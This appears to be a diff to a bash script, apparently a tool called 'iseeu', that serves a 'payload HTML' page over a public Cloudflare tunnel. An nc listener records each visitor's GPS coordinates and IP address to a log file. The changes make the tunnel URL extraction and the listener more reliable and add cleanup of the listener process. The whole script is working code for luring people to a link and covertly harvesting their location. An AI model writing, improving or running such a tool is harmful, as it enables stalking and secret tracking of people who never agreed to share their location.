@@ -10,18 +10,18 @@ WEB_DIR="$HOME/webpage"
 LOG_DIR="$HOME/iseeu/logs"
 TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
 LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
-CF_LOG="$LOG_DIR/cf_$TIMESTAMP.log"
+CF_LOG=$(mktemp)
 
 echo "[*] Killing existing processes..."
 pkill -f "python3 -m http.server" 2>/dev/null
 pkill -f cloudflared 2>/dev/null
-sleep 1
+pkill -f "nc -l -p" 2>/dev/null
 
 echo "[*] Creating/clearing directories..."
 mkdir -p "$WEB_DIR"
 mkdir -p "$LOG_DIR"
 > "$LOG_FILE"
-> "$CF_LOG"
+
 cd "$WEB_DIR" || exit 1
 
 echo "[*] Creating payload HTML..."
@@ -56,12 +56,12 @@ echo "[*] Starting Cloudflared tunnel..."
 cloudflared tunnel --url "http://localhost:$PORT" > "$CF_LOG" 2>&1 &
 CF_PID=$!
 
-# Wait for Cloudflared to be ready and get the public URL
+# Wait for public URL
 echo -n "[*] Waiting for Cloudflared URL"
-for i in {1..15}; do
+for i in {1..10}; do
   sleep 1
   echo -n "."
-  URL=$(grep -oE "https://.*\.trycloudflare\.com" "$CF_LOG" | tail -n1)
+  URL=$(grep -oE "https://[a-zA-Z0-9_-]+\.trycloudflare\.com" "$CF_LOG" | head -n1)
   if [[ -n "$URL" ]]; then break; fi
 done
 echo
@@ -70,29 +70,28 @@ if [[ -n "$URL" ]]; then
   echo "[✓] Public URL: $URL"
 else
   echo "[✗] Failed to get Cloudflared public URL."
-  kill "$SERVER_PID" "$CF_PID"
+  kill $SERVER_PID $CF_PID
   rm -f "$CF_LOG"
   exit 1
 fi
 
 echo "[*] Logging to $LOG_FILE..."
 
-# Start mini listener to detect /logme access
-(
-  while true; do
-    nc -l -p "$PORT" | while read -r line; do
-      if [[ "$line" == *"/logme/"* ]]; then
-        GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
-        IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-        echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
-      fi
-    done
+# Lightweight listener to capture coordinates
+(while true; do
+  { echo -ne "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"; } | nc -l -p "$PORT" | while read -r line; do
+    if [[ "$line" == *"/logme/"* ]]; then
+      GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
+      IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
+      echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
+    fi
   done
-) &
+done) &
 
-# Cleanup on Ctrl+C
-trap 'echo -e "\n[*] Cleaning up..."; kill $SERVER_PID $CF_PID 2>/dev/null; rm -f "$CF_LOG"; echo "[*] Done."; exit' INT
+LISTENER_PID=$!
+
+# Cleanup trap
+trap 'echo; echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID $LISTENER_PID 2>/dev/null; rm -f "$CF_LOG"; echo "[*] Done."; exit 0' INT
 
 echo "[*] Press Ctrl+C to stop."
-
 wait
